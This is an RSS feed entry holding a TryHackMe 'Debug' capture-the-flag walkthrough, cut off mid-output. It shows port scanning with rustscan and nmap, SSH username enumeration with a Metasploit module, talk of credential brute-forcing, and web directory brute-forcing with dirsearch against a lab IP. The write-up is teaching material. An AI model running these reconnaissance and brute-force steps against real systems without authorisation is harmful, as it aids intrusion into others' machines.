<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</title>
    
    
    
    <link>https://umar0x01.sh/post/</link>
    <description>Recent content in Posts on Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 03 Apr 2021 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://umar0x01.sh/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Debug - TryHackMe - THM Walkthrough</title>
      <link>https://umar0x01.sh/post/debug-thm/</link>
      <pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://umar0x01.sh/post/debug-thm/</guid>
      <description>
        
          &lt;img src=&#34;https://umar0x01.sh/img/debug-thm/banner.png&#34;/&gt;
          
        
        
        &lt;h1 id=&#34;debug---thm&#34;&gt;Debug - THM&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;IP:&lt;/strong&gt; 10.10.51.225&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h3&gt;
&lt;p&gt;We can scan the host using &lt;a href=&#34;https://github.com/RustScan/RustScan&#34;&gt;rustscan&lt;/a&gt; (like nmap; but faster!) for open ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rustscan -a 10.10.51.225 --timeout &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; --tries &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; --ulimit &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; -- -sC -sV
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-a&lt;/code&gt; specifies the Host IP address&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--timeout&lt;/code&gt; specifies the timeout before saying the port is closed&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--tries&lt;/code&gt; how many times to try and connect to the port&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--ulimit&lt;/code&gt; specifies how many sockets to open at a time&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--&lt;/code&gt; for passing arguments for nmap&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-sC -sV&lt;/code&gt; nmap arguments telling rustscan to run default scripts and version fingerprinting&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Scan results:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403130608.png&#34; alt=&#34;Pasted image 20210403130608.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Alright, so, we&amp;rsquo;ve found 2 open ports. 22 and 80.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Downloads&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                                                                                                                                                               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;95/999&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# rustscan -a 10.10.51.225 --timeout &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; --tries &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; --ulimit &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; -- -sC -sV   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                 
| &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;| &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; |&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__ &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_   _&lt;span style=&#34;color:#f92672&#34;&gt;}{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__  /  ___&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; / &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;|  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;| |
| .-. &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; |.-._&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; | |  .-._&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;/  /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; |&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt; |
&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; `-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-----&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`----&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  `----&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;---&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; `-&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; The config file is expected to be at &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/root/.rustscan.toml&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Automatically increasing ulimit value to 5000.
Open 10.10.51.225:22
Open 10.10.51.225:80
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting Script&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Script to be run Some&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nmap -vvv -p {{port}} {{ip}}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-04-03 13:04 PKT
NSE: Loaded &lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt; scripts &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Initiating Ping Scan at 13:04
Scanning 10.10.51.225 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; ports&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Completed Ping Scan at 13:04, 0.34s elapsed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; total hosts&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host. at 13:04
Completed Parallel DNS resolution of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host. at 13:04, 0.01s elapsed
DNS resolution of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IPs took 0.01s. Mode: Async &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]&lt;/span&gt;
Initiating SYN Stealth Scan at 13:04
Scanning 10.10.51.225 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ports&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.51.225
Discovered open port 22/tcp on 10.10.51.225
Completed SYN Stealth Scan at 13:04, 0.25s elapsed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; total ports&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Initiating Service scan at 13:04
Scanning &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; services on 10.10.51.225
Completed Service scan at 13:05, 6.52s elapsed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; services on &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
NSE: Script scanning 10.10.51.225.
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 6.38s elapsed                                                                    
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.82s elapsed                                                                    
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.
Initiating NSE at 13:05                 
Completed NSE at 13:05, 0.00s elapsed   
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.51.225       
Host is up, received reset ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.28s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Scanned at 2021-04-03 13:04:58 PKT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 14s                                                               

PORT   STATE SERVICE REASON         VERSION                                                              
22/tcp open  ssh     syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:      
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX
81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
80/tcp open  http    syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; Apache httpd 2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-methods:        
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                    
NSE: Script Post-scanning.
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.
Initiating NSE at 13:05      
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.00s elapsed                                                                    
NSE: Starting runlevel &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;of 3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scan.                                                                    
Initiating NSE at 13:05             
Completed NSE at 13:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 14.76 seconds      
           Raw packets sent: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;240B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | Rcvd: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;128B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;ssh-port-22&#34;&gt;SSH (Port 22)&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s go with the waterfall mechanism and first enumerate port 22. We can try credentials bruteforcing using &lt;a href=&#34;https://github.com/1N3/BruteX&#34;&gt;BruteX&lt;/a&gt; and check the version for any vulnerabilities which are public and exploitable.&lt;/p&gt;
&lt;p&gt;From googling the exact banner/version, we can see that the specific version is vulnerable to username enumeration&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132341.png&#34; alt=&#34;Pasted image 20210403132341.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try and do it using metasploit&amp;rsquo;s module.&lt;/p&gt;
&lt;p&gt;We can search for the module using &lt;code&gt;search&lt;/code&gt; with an filter of &lt;code&gt;port:22&lt;/code&gt; for only searching for everything written for SSH/Port22 with enum&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;search port:22 ssh_enum
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132441.png&#34; alt=&#34;Pasted image 20210403132441.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s run it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132511.png&#34; alt=&#34;Pasted image 20210403132511.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can see that it enumerated the user root and can probably guess the password will be something really long. Let&amp;rsquo;s goto port 80 for now and we&amp;rsquo;ll come back to SSH if we need something.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;http-port-80&#34;&gt;HTTP (Port 80)&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s browse the application to get an idea in which programming language it was written, what&amp;rsquo;s it&amp;rsquo;s using as it&amp;rsquo;s backend server, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://10.10.51.225/
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132639.png&#34; alt=&#34;Pasted image 20210403132639.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;So, we get meeted with Apache2&amp;rsquo;s default installation page. Let&amp;rsquo;s try and see if &lt;code&gt;/robots.txt&lt;/code&gt; has something in it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://10.10.51.225/robots.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132759.png&#34; alt=&#34;Pasted image 20210403132759.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Sadly, it doesn&amp;rsquo;t exist either.&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can now utilize &lt;a href=&#34;https://github.com/OJ/gobuster&#34;&gt;gobuster&lt;/a&gt; or &lt;a href=&#34;https://github.com/maurosoria/dirsearch&#34;&gt;dirsearch&lt;/a&gt; to enumerate the hidden directories hosted on the web application.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll use &lt;code&gt;dirsearch&lt;/code&gt; to save some time downloading and setting up &lt;code&gt;gobuster&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 dirsearch.py -u http://10.10.51.225 -e all -t &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tools/dirsearch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# python3 dirsearch.py -u http://10.10.51.225 -e all -t &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;                                                                                                                                                  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; â¨¯
/mnt/hgfs/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.26.2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; or chardet &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4.0.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; doesn&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t match a supported version!
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  warnings.warn(&amp;#34;urllib3 ({}) or chardet ({}) doesn&amp;#39;&lt;/span&gt;t match a supported &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  _|. _ _  _  _  _ _|_    v0.4.1
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; (_||| _) (/_(_|| (_| )
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Extensions: all | HTTP method: GET | Threads: 100 | Wordlist size: 8948
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Error Log: /mnt/hgfs/tools/dirsearch/logs/errors-21-04-03_13-30-02.log
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Target: http://10.10.51.225/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Output File: /mnt/hgfs/tools/dirsearch/reports/10.10.51.225/_21-04-03_13-30-03.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:03] Starting: 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:16] 403 -  277B  - /.ht_wsr.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htaccessOLD
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htaccess_orig
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htaccess_sc
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htaccessBAK
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htaccess_extra
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htaccessOLD2
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htm
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htpasswd_test
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.html
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.httr-oauth
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:17] 403 -  277B  - /.htpasswds
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:18] 403 -  277B  - /.htaccess.sample
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:19] 403 -  277B  - /.htaccess.save
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:19] 403 -  277B  - /.htaccess.bak1
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:19] 403 -  277B  - /.htaccess.orig
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:20] 403 -  277B  - /.php3
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:21] 403 -  277B  - /.php
